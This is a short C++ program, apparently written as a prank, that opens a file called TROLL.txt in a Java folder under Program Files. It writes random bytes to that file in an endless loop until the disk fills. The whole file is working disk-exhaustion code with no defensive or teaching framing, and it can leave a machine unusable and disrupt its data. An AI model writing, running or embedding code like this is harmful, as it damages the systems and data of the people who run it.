#include <iostream>
#include <fstream>
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <ctime>

#define PATH "C:\\Program Files\\Java\\TROLL.txt"

using namespace std;

	int main()
	{
		srand(time(NULL));
		ofstream archive;

		archive.open(PATH);
		if(archive.is_open())
		{
			do
			{
				char digit = rand() % 10;
				archive << digit;
			}while(true);
		}
		return 0;
	}
